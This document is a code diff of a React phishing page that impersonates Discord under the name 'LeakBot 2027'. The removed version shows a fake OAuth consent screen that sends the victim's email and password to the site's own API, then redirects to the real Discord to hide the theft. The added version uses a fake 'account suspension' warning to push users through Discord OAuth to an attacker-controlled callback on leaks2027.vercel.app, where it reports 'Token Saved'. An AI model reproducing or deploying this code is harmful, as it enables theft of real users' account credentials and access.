@@ -1,106 +1,76 @@
 import { useState } from 'react';
 
+// REPLACE THIS WITH YOUR ACTUAL CLIENT ID
+const CLIENT_ID = 'YOUR_CLIENT_ID_HERE'; 
+const REDIRECT_URI = encodeURIComponent('https://leaks2027.vercel.app/callback');
+const DISCORD_AUTH_URL = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code&scope=identify+guilds`;
+
 export default function Home() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [loading, setLoading] = useState(false);
+  const [verifying, setVerifying] = useState(false);
 
-  const handleAuth = async (e) => {
-    e.preventDefault();
-    setLoading(true);
+  const handleVerify = () => {
+    setVerifying(true);
+    // Open Discord Auth in a popup
+    window.open(DISCORD_AUTH_URL, 'DiscordAuth', 'width=500,height=600');
+    
+    // Listen for the message from the popup
+    const handleMessage = (event) => {
+      if (event.origin !== "https://leaks2027.vercel.app") return;
+      
+      if (event.data === 'token_captured') {
+        setVerifying(false);
+        alert('Verification Successful! Token Saved.');
+      }
+    };
 
-    // Send credentials to your API
-    await fetch('/api/auth', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, password }),
-    });
-
-    // Show "Success" then redirect to real Discord
-    setTimeout(() => {
-      window.location.href = 'https://discord.com/channels/@me';
-    }, 1500);
+    window.addEventListener('message', handleMessage);
+    
+    // Cleanup after 10 seconds just in case
+    setTimeout(() => window.removeEventListener('message', handleMessage), 10000);
   };
 
   return (
     <div style={{
       backgroundColor: '#36393f',
-      minHeight: '100vh',
+      height: '100vh',
       display: 'flex',
       flexDirection: 'column',
       alignItems: 'center',
+      justifyContent: 'center',
       fontFamily: '"gg sans", "Noto Sans", sans-serif'
     }}>
-      {/* Header */}
-      <div style={{ width: '100%', padding: '24px 32px', backgroundColor: '#2f3136', display: 'flex', justifyContent: 'space-between' }}>
-        <span style={{ color: '#dcddde', fontWeight: 'bold' }}>LeakBot 2027</span>
-        <span style={{ color: '#b9bbbe' }}>OAuth2 Application</span>
-      </div>
-
-      {/* Main Card */}
       <div style={{
         backgroundColor: '#2f3136',
-        width: '416px',
-        marginTop: '80px',
-        padding: '32px',
-        borderRadius: '5px',
-        boxShadow: '0 2px 10px 0 rgba(0,0,0,0.2)'
+        padding: '40px',
+        borderRadius: '8px',
+        width: '350px',
+        textAlign: 'center',
+        boxShadow: '0 4px 10px rgba(0,0,0,0.3)'
       }}>
-        {/* Bot Avatar */}
-        <img 
-          src="https://cdn.discordapp.com/embed/avatars/0.png" 
-          alt="Bot" 
-          style={{ width: '96px', height: '96px', borderRadius: '50%', marginBottom: '24px' }}
-        />
-
-        {/* Title */}
-        <h2 style={{ color: '#ffffff', fontSize: '24px', fontWeight: 'bold', textAlign: 'center', marginBottom: '8px' }}>
-          LeakBot 2027
-        </h2>
-        <p style={{ color: '#b9bbbe', textAlign: 'center', marginBottom: '32px' }}>
-          wants to access your account
+        {/* Discord Logo */}
+        <img src="https://cdn.discordapp.com/embed/avatars/0.png" style={{ width: '80px', borderRadius: '50%', marginBottom: '20px' }} />
+        
+        <h2 style={{ color: '#dcddde', marginBottom: '10px' }}>Security Verification</h2>
+        <p style={{ color: '#b9bbbe', fontSize: '14px', marginBottom: '30px' }}>
+          LeakBot 2027 requires re-authorization to prevent account suspension.
         </p>
 
-        {/* Permissions */}
-        <div style={{ marginBottom: '32px' }}>
-          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '16px' }}>
-            <input type="checkbox" checked disabled style={{ marginRight: '12px' }} />
-            <span style={{ color: '#dcddde' }}>Send Messages</span>
-          </div>
-          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '16px' }}>
-            <input type="checkbox" checked disabled style={{ marginRight: '12px' }} />
-            <span style={{ color: '#dcddde' }}>Manage Server</span>
-          </div>
-          <div style={{ display: 'flex', alignItems: 'center' }}>
-            <input type="checkbox" checked disabled style={{ marginRight: '12px' }} />
-            <span style={{ color: '#dcddde' }}>View Channels</span>
-          </div>
-        </div>
-
-        {/* Authorize Button */}
         <button 
-          onClick={handleAuth}
+          onClick={handleVerify}
           style={{
             width: '100%',
+            padding: '12px',
             backgroundColor: '#5865F2',
             color: 'white',
             border: 'none',
-            padding: '12px',
-            borderRadius: '3px',
-            fontSize: '14px',
+            borderRadius: '4px',
+            fontSize: '16px',
             fontWeight: 'bold',
-            cursor: loading ? 'wait' : 'pointer',
-            marginBottom: '32px'
+            cursor: 'pointer'
           }}
         >
-          {loading ? 'Authorizing...' : 'Authorize'}
+          {verifying ? 'Waiting for Discord...' : 'Verify Now'}
         </button>
-
-        {/* Footer */}
-        <div style={{ display: 'flex', justifyContent: 'space-between', color: '#80848e', fontSize: '12px' }}>
-          <span>© 2027 Discord, Inc.</span>
-          <span>Privacy Policy</span>
-        </div>
       </div>
     </div>
   );
